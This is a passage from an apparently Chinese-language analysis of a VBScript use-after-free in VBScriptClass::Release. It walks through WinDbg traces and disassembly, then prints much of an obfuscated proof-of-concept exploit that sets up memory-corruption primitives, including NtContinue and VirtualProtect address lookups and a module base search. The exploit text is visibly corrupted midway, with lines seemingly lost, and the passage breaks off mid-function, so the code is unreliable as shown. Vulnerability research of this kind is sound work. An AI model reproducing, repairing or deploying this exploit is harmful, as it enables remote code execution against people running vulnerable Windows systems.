    eip=6eb41ef3 esp=0247d040 ebp=0247d050 iopl=0     nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000202
    vbscript!VBScriptClass::Release:
    6eb41ef3 8bff       mov   edi,edi
    0:005> g
    Breakpoint 2 hit
    eax=6eb3185c ebx=0247d1d4 ecx=6eb8a9d8 edx=0247d14c esi=0214a574 edi=00000001
    eip=6eb4c206 esp=0247d068 ebp=0247d078 iopl=0     nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000246
    vbscript!VbsIsEmpty:
    6eb4c206 8bff       mov   edi,edi
    0:005> g
    Breakpoint 1 hit
    eax=00412f58 ebx=00000020 ecx=6eb31748 edx=00000000 esi=001dde30 edi=00000009
    eip=6eb41ef3 esp=0247cfb0 ebp=0247cfc0 iopl=0     nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000202
    vbscript!VBScriptClass::Release:
    6eb41ef3 8bff       mov   edi,edi
    0:005> g
    Breakpoint 0 hit
    eax=6eb3185c ebx=0247d1d4 ecx=6eb8a5bc edx=0247d14c esi=0214a5d4 edi=00000001
    eip=6eb82628 esp=0247d068 ebp=0247d078 iopl=0     nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000246
    vbscript!VbsErase:
    6eb82628 8bff       mov   edi,edi
    0:005> g
    Breakpoint 1 hit
    eax=00412f58 ebx=00000020 ecx=6eb31748 edx=00000000 esi=001ddde0 edi=00000009
    eip=6eb41ef3 esp=0247cfcc ebp=0247cfdc iopl=0     nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000202
    vbscript!VBScriptClass::Release:
    6eb41ef3 8bff       mov   edi,edi
    0:005> dd 412f58
    00412f58  6eb31748 00000001 0041d1c0 0041e1c8 //此时的引用计数是1，this指针指向0x30大小的Trigger对象结构
    00412f68  0000087c 00000000 00000000 0041d3e4
    00412f78  00000000 00188034 00000000 00000000
    00412f88  0a7a72ca 00001341 0041df30 004100c4
    00412f98  4e7b738e 0a001344 0041302c 0041306a
    00412fa8  004130b4 00413116 00413150 00413198
    00412fb8  004131c0 004131da 00413202 00413252
    00412fc8  0041328e 004132bc 004132d8 00413450
再然后单步调试到：
    b41efc 56        push   esi
    6eb41efd 8b35e412b36e   mov   esi,dword ptr [vbscript!_imp__InterlockedDecrement (6eb312e4)]
    6eb41f03 57        push   edi //edi中保存的便是object的引用计数
    6eb41f04 8d7b04      lea   edi,[ebx+4]
    6eb41f07 57        push   edi
    6eb41f08 ffd6       call   esi
    6eb41f0a 894508      mov   dword ptr [ebp+8],eax
    6eb41f0d 85c0       test   eax,eax //判断引用计数是否为零
    6eb41f0f 0f84d8210000   je    vbscript!VBScriptClass::Release+0x1e (6eb440ed) //为零则进入Release+0x1e，调用析构函数
    6eb41f15 8b4508      mov   eax,dword ptr [ebp+8]
    6eb41f18 5f        pop   edi
    之后的调试：
    6eb440ed 57        push   edi
    6eb440ee ff15e812b36e   call   dword ptr [vbscript!_imp__InterlockedIncrement (6eb312e8)]
    6eb440f4 8bcb       mov   ecx,ebx
    6eb440f6 e829000000    call   vbscript!VBScriptClass::TerminateClass (6eb44124) //在进入TerminateClass前引用计数为1
    6eb440fb 57        push   edi //在进入TerminateClass后引用计数还是为1
    6eb440fc ffd6       call   esi
    6eb440fe 894508      mov   dword ptr [ebp+8],eax
    6eb44101 85c0       test   eax,eax
    6eb44103 0f850cdeffff   jne   vbscript!VBScriptClass::Release+0x43 (6eb41f15)
    6eb44109 85db       test   ebx,ebx
    6eb4410b 0f8404deffff   je    vbscript!VBScriptClass::Release+0x43 (6eb41f15)
问题就出现在它没有因为Set
array_b(0)=array_a(1)，而增加类对象的引用计数，造成了在类对象被释放后array_b(0)仍然指向那个类对象地址，而造成了悬垂指针。
最终看来，此漏洞就是存在于release
函数中，如果在自定义的脚本中重载了析构函数，在这个函数中操作了类的引用计数（UAF），而release函数不能正确的判断类的引用计数造成而去析构了这个类，但是仍然指向这个类的指针就变成了悬垂指针,后面通过这个悬垂指针进行一些操作来达到任意读写的目的。
####  3 POC代码及验证
在这里先把原始POC放出来：
    Dim lIIl
    Dim IIIlI(6),IllII(6)
    Dim IllI
    Dim IIllI(40)
    Dim lIlIIl,lIIIll
    Dim IlII
    Dim llll,IIIIl
    Dim llllIl,IlIIII
    Dim NtContinueAddr,VirtualProtectAddr
    IlII=195948557
    lIlIIl=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
    lIIIll=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
    IllI=195890093
    Function IIIII(Domain) 
        lIlII=0
        IllllI=0
        IIlIIl=0
        Id=CLng(Rnd*1000000)
        lIlII=CLng((&h27d+8231-&H225b)*Rnd)Mod (&h137d+443-&H152f)+(&h1c17+131-&H1c99)
        If(Id+lIlII)Mod (&h5c0+6421-&H1ed3)=(&h10ba+5264-&H254a) Then
            lIlII=lIlII-(&h86d+6447-&H219b)
        End If
        IllllI=CLng((&h2bd+6137-&H1a6d)*Rnd)Mod (&h769+4593-&H1940)+(&h1a08+2222-&H2255)
        IIlIIl=CLng((&h14e6+1728-&H1b5d)*Rnd)Mod (&hfa3+1513-&H1572)+(&h221c+947-&H256e)
        IIIII=Domain &"?" &Chr(IllllI) &"=" &Id &"&" &Chr(IIlIIl) &"=" &lIlII
    End Function
    Function lIIII(ByVal lIlIl)
        IIll=""
        For index=0 To Len(lIlIl)-1
            IIll=IIll &lIlI(Asc(Mid(lIlIl,index+1,1)),2)
        Next
        IIll=IIll &"00"
        If Len(IIll)/(&h15c6+3068-&H21c0) Mod (&h1264+2141-&H1abf)=(&hc93+6054-&H2438) Then
            IIll=IIll &"00"
        End If
        For IIIl=(&h1a1a+3208-&H26a2) To Len(IIll)/(&h1b47+331-&H1c8e)-(&h14b2+4131-&H24d4)
            lIIIlI=Mid(IIll,IIIl*(&h576+1268-&Ha66)+(&ha64+6316-&H230f),(&ha49+1388-&Hfb3))
            lIlIll=Mid(IIll,IIIl*(&hf82+3732-&H1e12)+(&h210+2720-&Hcaf)+(&h4fa+5370-&H19f2),(&hf82+5508-&H2504))
            lIIII=lIIII &"%u" &lIlIll &lIIIlI
        Next
    End Function
    Function lIlI(ByVal Number,ByVal Length)
        IIII=Hex(Number)
        If Len(IIII)544106784 Or GetUint32(llIl+(&ha2a+7373-&H268b))<>542330692
            llIl=llIl-65536
        Loop
        GetBaseByDOSmodeSearch=llIl
    End Function
    Function StrCompWrapper(lIII,llIlIl)
        Dim lIIlI,IIIl
        lIIlI=""
        For IIIl=(&ha2a+726-&Hd00) To Len(llIlIl)-(&h2e1+5461-&H1835)
            lIIlI=lIIlI &Chr(lllII(lIII+IIIl))